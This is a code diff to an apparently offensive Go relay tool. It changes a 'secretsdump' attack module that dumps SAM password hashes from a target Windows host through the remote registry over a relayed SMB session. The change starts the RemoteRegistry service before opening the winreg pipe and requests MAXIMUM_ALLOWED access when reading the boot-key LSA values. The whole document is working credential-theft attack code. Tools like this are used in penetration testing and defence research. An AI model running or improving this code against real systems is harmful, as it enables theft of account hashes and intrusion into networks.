@@ -43,10 +43,17 @@ func (a *SecretsdumpAttack) Run(session interface{}, config *Config) error {
 func secretsdumpAttack(client *SMBRelayClient, cfg *Config) error {
 	log.Printf("[*] Dumping SAM hashes via remote registry on %s", cfg.TargetAddr)
 
-	// Step 1: Connect to IPC$ and open winreg pipe
+	// Step 1: Connect to IPC$ and ensure RemoteRegistry is running before
+	// opening the winreg pipe. Without this the winreg CreatePipe
+	// intermittently fails with PIPE_NOT_AVAILABLE when the service is
+	// stopped or disabled (KNOWN_ISSUES.md #3). Matches the standalone
+	// secretsdump pattern.
 	if err := client.TreeConnect("IPC$"); err != nil {
 		return fmt.Errorf("tree connect IPC$: %v", err)
 	}
+
+	rrState := ensureRemoteRegistryStarted(client)
+	defer restoreRemoteRegistryState(client, rrState)
 
 	fileID, err := client.CreatePipe("winreg")
 	if err != nil {
@@ -163,7 +170,7 @@ func getBootKeyViaRelay(rpcClient *dcerpc.Client) ([]byte, error) {
 	defer winreg.BaseRegCloseKey(rpcClient, hklm)
 
 	// Get current control set
-	selectKey, err := winreg.BaseRegOpenKey(rpcClient, hklm, "SYSTEM\\Select", 1, winreg.KEY_READ)
+	selectKey, err := winreg.BaseRegOpenKey(rpcClient, hklm, "SYSTEM\\Select", 1, winreg.MAXIMUM_ALLOWED)
 	if err != nil {
 		return nil, fmt.Errorf("open SYSTEM\\Select: %v", err)
 	}
@@ -192,7 +199,7 @@ func getBootKeyViaRelay(rpcClient *dcerpc.Client) ([]byte, error) {
 	for _, keyName := range keyNames {
 		path := fmt.Sprintf("SYSTEM\\%s\\Control\\Lsa\\%s", controlSet, keyName)
 
-		keyHandle, err := winreg.BaseRegOpenKey(rpcClient, hklm, path, 1, winreg.KEY_READ)
+		keyHandle, err := winreg.BaseRegOpenKey(rpcClient, hklm, path, 1, winreg.MAXIMUM_ALLOWED)
 		if err != nil {
 			return nil, fmt.Errorf("open %s: %v", path, err)
 		}
